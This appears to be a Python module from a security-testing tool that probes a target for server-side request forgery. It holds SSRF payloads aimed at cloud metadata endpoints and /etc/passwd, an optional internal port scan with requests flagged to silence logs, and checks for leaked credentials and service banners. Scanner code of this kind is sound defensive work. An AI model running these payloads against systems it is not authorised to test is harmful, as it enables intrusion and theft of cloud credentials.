from typing import Any, Dict
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_ssrf_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Server-Side Request Forgery (SSRF)
    """
    # Common Internal/Cloud Targets
    ssrf_payloads = [
        "http://metadata.google.internal/", # GCP
        "http://169.254.169.254/latest/meta-data/", # AWS
        "file:///etc/passwd",
        "http://127.0.0.1:22",
    ]
    
    fields = scenario.config.get("fields", ["url", "webhook", "callback"])
    issues = []
    leaked_data = []
    
    for field in fields:
        for p in ssrf_payloads:
            body = {"url": "http://example.com"} # Default valid
            body[field] = p
            
            resp = client.send(scenario.method, scenario.target, json_body=body)
            
            if resp.status_code == 0: continue
            
            # AGGRESSIVE: Internal Port Scan (Redis/MySQL/Admin)
            if scenario.config.get("aggressive"):
                ports = [6379, 3306, 8080, 8000, 9200, 27017]
                for port in ports:
                    try:
                        p_url = f"http://127.0.0.1:{port}"
                        body_scan = body.copy()
                        body_scan[field] = p_url
                        # Use is_canary=True to silence logs during port scan
                        r_scan = client.send(scenario.method, scenario.target, json_body=body_scan, timeout=1.5, is_canary=True)
                        
                        # High-Confidence SSRF Check:
                        # 1. Status code changed from 4XX to 2XX/3XX
                        # 2. Response text contains service banners
                        if r_scan.status_code != resp.status_code and r_scan.status_code != 0:
                            indicators = ["redis", "mysql", "mongodb", "elasticsearch", "ssh-", "220 ", "550 "]
                            if any(i in r_scan.text.lower() for i in indicators):
                                 issues.append(f"SSRF Port Scan: Port {port} responding with Service Banner ({r_scan.status_code})")
                            elif r_scan.status_code == 200 and resp.status_code >= 400:
                                 issues.append(f"SSRF Port Scan: Port {port} reachable (Status 200)")
                    except: pass

            suspicious = False
            reasons = []
            
            lower_text = resp.text.lower()
            
            # Evidence: Metadata Leak
            # AWS usually returns list like 'ami-id', 'instance-id'
            aws_keys = ["ami-id", "instance-id", "iam/security-credentials"]
            for k in aws_keys:
                if k in lower_text:
                    suspicious = True
                    reasons.append(f"AWS Metadata Leak ({k})")
                    leaked_data.append(f"AWS Data: {resp.text[:100]}...")
            
            # File Leak
            if "root:x:0:0" in lower_text:
                suspicious = True
                reasons.append("File Leak (/etc/passwd)")
                leaked_data.append(f"Shadow File: {resp.text[:100]}...")
                
            # Internal Port Scan
            if "SSH-" in resp.text:
                suspicious = True
                reasons.append("Internal Service (SSH) Banner")
                leaked_data.append(f"Banner: {resp.text.strip()}")

            if suspicious:
                issues.append(f"[CRITICAL] SSRF in '{field}': {', '.join(reasons)}")

    # Confidence Logic
    confidence = "LOW"
    if issues:
        # Check reasons
        # Metadata/File Leak = CONFIRMED
        # Banner = HIGH (could be a honeypot or weird proxy)
        # Timing (future) = MEDIUM
        
        all_reasons = " ".join([i for sub in [x.split(': ')[1] for x in issues] for x in sub]) if issues else ""
        # Actually easier to check the issue text strings added previously
        
        is_leak = any(x in str(issues) for x in ["Metadata Leak", "File Leak"])
        if is_leak:
             confidence = "CONFIRMED"
        elif "Banner" in str(issues):
             confidence = "HIGH"
        else:
             confidence = "MEDIUM"

    return {
        "scenario_id": scenario.id,
        "attack_type": "ssrf",
        "passed": len(issues) == 0,
        "confidence": confidence if issues else "LOW",
        "details": {"issues": issues, "leaked_data": leaked_data}
    }
